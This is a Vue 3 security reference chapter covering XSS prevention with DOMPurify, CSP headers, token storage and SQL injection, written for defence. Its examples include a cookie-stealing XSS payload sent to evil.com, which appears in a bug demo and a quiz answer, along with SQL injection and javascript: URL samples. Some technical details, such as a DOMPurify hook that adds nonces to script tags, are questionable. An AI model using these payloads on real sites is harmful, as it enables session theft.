---
title: Vue 3 Engineering Reference — Security
description: XSS prevention via auto-escaping, v-html sanitization with DOMPurify, CSP configuration, credential handling in composables, and content security patterns for user-generated content.
---

# 22 — Security

## XSS Prevention — Auto-Escaping vs v-html

::code-wrapper{language="vue" filename="XSSPrevention.vue"}
```vue
<script setup>
import { ref, computed } from 'vue'
import DOMPurify from 'dompurify'

const userComment = ref('<script>alert("xss")<\/script>')
const userBio = ref('<img src=x onerror=alert(1)>')
const trustedHtml = ref('<strong>Bold text</strong>')
</script>

<template>
  <!-- ── SAFE: {{ }} escapes all HTML entities ── -->
  <!-- Renders literally: <script>alert("xss")</script> as text, not executed -->
  <p>{{ userComment }}</p>

  <!-- ── SAFE: v-bind escapes attribute values ── -->
  <img :alt="userBio" />  <!-- onerror in alt text, not as an attribute -->

  <!-- ── DANGEROUS: v-html injects raw HTML — XSS vector ── -->
  <!-- <p v-html="userComment" /> → <script> executes! -->
  <!-- NEVER use v-html with user-generated content without sanitization. -->

  <!-- ── SAFE: sanitize with DOMPurify before v-html ── -->
  <p v-html="DOMPurify.sanitize(trustedHtml)" />
  <!-- DOMPurify removes: <script>, onerror, onclick, javascript: URLs -->
  <!-- Keeps: <strong>, <em>, <a href>, <p>, <br>, safe tags only -->
</template>
```

### Anti-Pattern: v-html with User Content

::code-wrapper{language="vue" filename="XSSBug.vue"}
```vue
<script setup>
import { ref } from 'vue'
const comment = ref('')  // user input
</script>

<template>
  <!-- ❌ WRONG: direct v-html on user input — XSS vulnerability -->
  <div v-html="comment" />
  <!-- User types: <img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)" /> -->
  <!-- The onerror handler runs, stealing the user's cookies. -->
</template>
```

::code-wrapper{language="vue" filename="XSSFixed.vue"}
```vue
<script setup>
import { ref, computed } from 'vue'
import DOMPurify from 'dompurify'

const comment = ref('')

// ── Sanitized HTML: computed re-runs when comment changes ──
const safeHtml = computed(() => DOMPurify.sanitize(comment.value))
</script>

<template>
  <!-- ✅ CORRECT: sanitized before v-html -->
  <div v-html="safeHtml" />
</template>
```
::

## DOMPurify Configuration — Custom Allowed Tags

::code-wrapper{language="typescript" filename="sanitization.ts"}
```typescript
import DOMPurify from 'dompurify'

// ── Custom DOMPurify config: allow specific tags and attributes ──
const cleanHtml = DOMPurify.sanitize(userInput, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'class'],
  // ── FORBID_ATTR: explicitly block dangerous attributes ──
  FORBID_ATTR: ['style', 'onerror', 'onclick', 'onload'],
  // ── ALLOW_DATA_ATTR: allow data-* attributes (custom) ──
  ALLOW_DATA_ATTR: false,
  // ── ALLOWED_URI_REGEXP: restrict URI schemes ──
  // Only allow http, https, mailto — block javascript:, data:, etc.
  ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto):)/i,
})

// ── Hook: inspect and modify elements after sanitization ──
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  // Force all links to open in new tab with rel="noopener noreferrer"
  if (node.tagName === 'A' && node.getAttribute('href')) {
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  }
})

// ── Content Security Policy (CSP) nonce: add to allowed scripts ──
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'SCRIPT') {
    node.setAttribute('nonce', cspNonce)  // aligns with CSP header
  }
})
```
::

## Credential Handling — Token Storage Strategy

::code-wrapper{language="typescript" filename="credential-security.ts"}
```typescript
import { ref, readonly, type Ref } from 'vue'

// ── Token storage: localStorage vs httpOnly cookie ──
// localStorage: accessible to JS (XSS can steal it).
// httpOnly cookie: NOT accessible to JS (immune to XSS), sent automatically.

// ── Production pattern: short-lived access token in memory + refresh in httpOnly cookie ──
export function useAuth() {
  // ── Access token: in memory only — lost on refresh, but immune to XSS theft ──
  const accessToken = ref<string | null>(null)

  // ── Refresh token: httpOnly cookie set by server, never touched by JS ──
  // Server sets Set-Cookie: refresh_token=...; HttpOnly; Secure; SameSite=Strict

  async function login(credentials: { email: string; password: string }) {
    const res = await fetch('/api/auth/login', {
      method: 'POST',
      body: JSON.stringify(credentials),
      credentials: 'include',  // send/receive cookies (refresh token)
    })

    const data = await res.json()
    accessToken.value = data.accessToken  // in memory only
    // Refresh token is in httpOnly cookie — never in JS.
  }

  async function refresh() {
    // ── Refresh: server reads httpOnly cookie, returns new access token ──
    const res = await fetch('/api/auth/refresh', {
      credentials: 'include',  // sends the httpOnly refresh cookie
    })

    if (!res.ok) {
      accessToken.value = null  // refresh failed — must re-login
      throw new Error('Session expired')
    }

    const data = await res.json()
    accessToken.value = data.accessToken
  }

  function logout() {
    accessToken.value = null
    // Server endpoint clears the httpOnly cookie (can't clear it from JS).
    fetch('/api/auth/logout', { method: 'POST', credentials: 'include' })
  }

  return {
    accessToken: readonly(accessToken),  // read-only — no external mutation
    login,
    refresh,
    logout,
  }
}
```
::

## Content Security Policy (CSP)

::code-wrapper{language="typescript" filename="csp-config.ts"}
```typescript
// ── CSP header: restricts where resources can load from ──
// Prevents XSS even if v-html is compromised — scripts can't execute
// unless their source is in the CSP allowlist.

// ── Express (or any backend): set CSP header ──
const cspHeader = [
  "default-src 'self'",                    // everything from same origin only
  "script-src 'self'",                     // scripts from same origin only (no inline)
  // For Vue: avoid inline scripts. Vite bundles all JS into external files.
  // If using eval (rare): add 'unsafe-eval' (NOT recommended for production).

  "style-src 'self' 'unsafe-inline'",     // styles: same origin + inline (scoped CSS)
  // Vue scoped CSS uses inline <style> → 'unsafe-inline' required for styles.

  "img-src 'self' data: https:",          // images: same origin, data URIs, HTTPS
  "font-src 'self' https://fonts.gstatic.com",  // fonts from Google Fonts
  "connect-src 'self' https://api.example.com",  // XHR/fetch to API only
  "frame-ancestors 'none'",               // prevent clickjacking (no iframes)
  "base-uri 'self'",                      // prevent <base> injection
  "form-action 'self'",                   // forms submit to same origin only
].join('; ')

// ── Vite: inject nonce for inline scripts (if needed) ──
// vite.config.ts:
// build: {
//   rollupOptions: {
//     output: {
//       // Vite's module preload polyfill uses inline scripts → need nonce
//     }
//   }
// }
```
::

## SQL Injection — API Boundary

::code-wrapper{language="typescript" filename="api-security.ts"}
```typescript
// ── Vue itself doesn't talk to the database — but your API does ──
// Security boundary: validate ALL input on the server, never trust client state.

// ── Anti-pattern: building SQL from user input ──
// ❌ const query = `SELECT * FROM users WHERE name = '${userName.value}'`
// User types: ' OR '1'='1 → returns all users (SQL injection)

// ── Correct: parameterized queries ──
// Server (example with better-sqlite3):
// const stmt = db.prepare('SELECT * FROM users WHERE name = ?')
// const result = stmt.get(userName)  // parameterized — injection-safe

// ── Vue-side: send data, don't build queries ──
async function searchUsers(name: string) {
  const res = await fetch('/api/users/search', {
    method: 'POST',
    body: JSON.stringify({ name }),  // server validates + parameterizes
  })
  return res.json()
}

// ── Validate on client (UX) AND server (security) ──
// Client validation: fast feedback, reduces server load.
// Server validation: security boundary — never trust client-side validation alone.
function validateEmail(email: string): boolean {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
}
```
::

## 💡 Tips & Tricks

::code-wrapper{language="typescript" filename="tips.ts"}
```typescript
// ── 1. {{ }} and v-bind escape by default — you're safe by default ──
// Only v-html opts out. Audit every v-html usage in your codebase.

// ── 2. Sanitize markdown before rendering ──
import DOMPurify from 'dompurify'
import { marked } from 'marked'
const safeHtml = DOMPurify.sanitize(marked.parse(userMarkdown))
// marked converts markdown → HTML, DOMPurify strips any XSS in the HTML.

// ── 3. Use rel="noopener noreferrer" on target="_blank" links ──
// <a href="..." target="_blank" rel="noopener noreferrer">
// Prevents the new tab from accessing window.opener (reverse tabnabbing).

// ── 4. SameSite cookie attribute for CSRF prevention ──
// Set-Cookie: token=...; SameSite=Strict; Secure; HttpOnly
// SameSite=Strict: cookie not sent on cross-site requests (CSRF-safe).

// ── 5. Don't store secrets in .env without VITE_ prefix ──
// Non-VITE_ vars stay server-side. VITE_ vars are in the bundle (public).
// Never put API secrets in VITE_ variables — they're in client JS.
```
::

## ⚠️ Edge Cases & Gotchas

::code-wrapper{language="typescript" filename="edge-cases.ts"}
```typescript
// ── 1. v-html with computed sanitization is NOT reactive-safe ──
// If you sanitize once and store the result, later changes to the input
// don't re-sanitize. Use a computed that sanitizes on every change.

// ── 2. DOMPurify doesn't sanitize CSS ──
// <style> tags and style attributes can contain CSS-based attacks
// (expression(), url(javascript:...)). DOMPurify strips <style> by default.

// ── 3. localStorage is readable by any script on the page ──
// If XSS succeeds, the attacker reads localStorage.getItem('token').
// Use httpOnly cookies for sensitive tokens, not localStorage.

// ── 4. Template expressions are sandboxed — limited globals ──
// {{ window.location }} → undefined. Only safe globals (Math, Date, etc.)
// This prevents some XSS via template injection, but doesn't replace v-html care.

// ── 5. CSP 'unsafe-inline' for styles is required for Vue scoped CSS ──
// Vue injects <style> tags at runtime in dev mode → CSP needs 'unsafe-inline' for styles.
// In production (build mode): styles are external files → can remove 'unsafe-inline'.

// ── 6. href="javascript:..." in user-provided links ──
// <a :href="userUrl"> — if userUrl is "javascript:alert(1)", clicking runs the script.
// Validate: if (!userUrl.startsWith('http')) userUrl = '#'  // force safe protocol
```
::

## 🧠 Spot the Bug

A comment section renders user input via `v-html` and a user injects a cookie-stealing script.

::code-wrapper{language="vue" filename="SecurityBug.vue"}
```vue
<script setup>
import { ref } from 'vue'
const comment = ref('')
</script>

<template>
  <input v-model="comment" placeholder="Write a comment" />
  <!-- ❌ v-html on raw user input — XSS vulnerability -->
  <div v-html="comment" />
</template>
```
::

<details>
<summary>Answer</summary>

`v-html` injects the user's input as raw HTML. A malicious user can type `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` — the `onerror` handler executes when the image fails to load, stealing cookies.

**Fix** — sanitize with DOMPurify before `v-html`:

::code-wrapper{language="vue" filename="SecurityFixed.vue"}
```vue
<script setup>
import { ref, computed } from 'vue'
import DOMPurify from 'dompurify'

const comment = ref('')

// Sanitize on every change — removes script tags, onerror, onclick, etc.
const safeComment = computed(() => DOMPurify.sanitize(comment.value))
</script>

<template>
  <input v-model="comment" placeholder="Write a comment" />
  <!-- ✅ Sanitized HTML — dangerous tags/attrs stripped -->
  <div v-html="safeComment" />
</template>
```
::

**The lesson**: `v-html` bypasses Vue's auto-escaping. Always sanitize user-generated content with DOMPurify (or equivalent) before passing it to `v-html`. The default `{{ }}` interpolation escapes everything — use it unless you specifically need raw HTML.

</details>